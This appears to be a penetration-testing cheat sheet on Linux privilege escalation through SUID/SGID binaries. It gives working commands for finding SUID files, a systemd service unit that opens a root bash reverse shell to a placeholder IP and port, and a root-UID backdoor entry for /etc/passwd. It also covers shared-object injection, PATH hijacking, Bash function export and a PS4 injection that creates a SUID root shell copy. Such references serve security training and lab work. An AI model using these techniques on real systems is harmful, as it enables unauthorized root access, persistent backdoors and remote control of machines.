---
description: Most common type of privilege escalation techniqu
---

# Using files with SUID/SGID permission set

## What is SUID?

Set owner User ID, also known as Set user ID or setuid is a special flag in Linux permission set.

## Find files with SUID set

```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

```
find / -perm -u=s -type f 2>/dev/null
```

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

## Exploiting systemctl

#### Reverse shell to root user

```
[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<IP ADDRESS>/<PORT> 0>&1"
```

## Modifying /etc/passwd with write access

With a user that has write access to `/etc/passwd` file, we can add a new user credentials and gain root user access.

* Generate a new password hash using the username as salt, here we are going to use `new` as a salt and `123` as our password.

```bash
openssl passwd -1 -salt new 123
```

* Next copy the hash generated, change the following entry and  enter it into the `/etc/passwd` file's end. Remember to change new with your selected username.

```
new:<hash>:0:0:root:/root:/bin/bash
```

* Now we use the following command and supply our password to gain root access.

```bash
su new   
```

## Shared Object Injection

When a program executes it will try to load the shared objects it requires from a specific path. If we can write to that directory/path the program tries to open then we can have a root shell spawned by a malicious shared object file (`.so` file).

After finding a SUID binary we can run `strace` on the file and search the output for open/access calls and for "no such file" errors:

```
strace <full path to file> 2>&1 | grep -iE "open|access|no such file"
strace -v -f -e execve <command> 2>&1 | grep exec 
```

The `ldd` and `readelf` commands can also be useed as follows:

```
ldd $(which <suid binary>)
readelf $(which <suid binary>)
```

The `strings` command can also be used to find the shared object names being used by a file.

```
strings /path/to/file
```

The `ltrace` command is a Linux debugging tool that displays calls made to shared libraries and system calls.

```
ltrace <command>
```

Compiling a new shared object syntax

```
gcc -shared -fPIC -o /path/to/original/file.so /path/to/code.c
```

## Abusing PATH environment variable

The `PATH` environment variable contains a list of directories where a shell should find programs.&#x20;

In case a program tries to execute another program but only specifies the name of the latter instead of the full path, the shell looks for it in the PATH directories until it's found.

Since the PATH variable is under user's control it can be modified so that the shell makes the program call the new malicious binary in a usser specified directory.

### Find Vulnerable Programs

```
strace -v -f -e execve <command> 2>&1 | grep exec
strings /path/to/file
ltrace <command>
```

After fining the program being called with relative path instead of the full path value, we can create prepend the directory in which we have our vulnerable executable to the `PATH` variable and call the program.

For Eg: let's say a program `/usr/bin/start` is a SUID file and has a line `service apache2 start` which we find by running strings on it. Since the `service` command is being called directly instead of it's full path (eg: `/usr/bin/service`). We can create a new vulnerable service command in a writeable directory, prepend the current directory to the `PATH` variable and call the `start` binary to get a root shell.

```
user@kali$ PATH=.:$PATH /usr/bin/start
```

## Abusing shell features

In Bash versions < 4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Shell features can useful in cases where `PATH` environment variable cannot be exploited. In situations where a binary using absolute path for calling a command/service/binary, shell features can be useful.

For Eg:  let's say a program `/usr/bin/start` is a SUID file and has a line `/usr/bin/service apache2 start` which we find by running strings on it.  We can create a Bash function with the name "`/usr/bin/service`" that executes a new Bash shell (using `-p` so permissions are preserved) and export the function:

```
function /usr/bin/service { /bin/bash -p; }
export -f /usr/bin/service
```

Now when `/usr/bin/start` is called we get a root shell.

In Bash versions < 4.4, when in debugging mode, Bash uses the environment variable `PS4` to display an extra prompt for debugging statements.

For Eg:  let's say a program `/usr/bin/start` is a SUID file and has a line `/usr/bin/service apache2 start` which we find by running strings on it. We can run the `/usr/bin/start` executable with bash debugging enabled and the `PS4` variable set to an embedded command which creates an SUID version of /bin/bash:

{% code overflow="wrap" %}
```
user@kali$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/bin/start
```
{% endcode %}

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

```
user@kali$ /tmp/rootbash -p
```



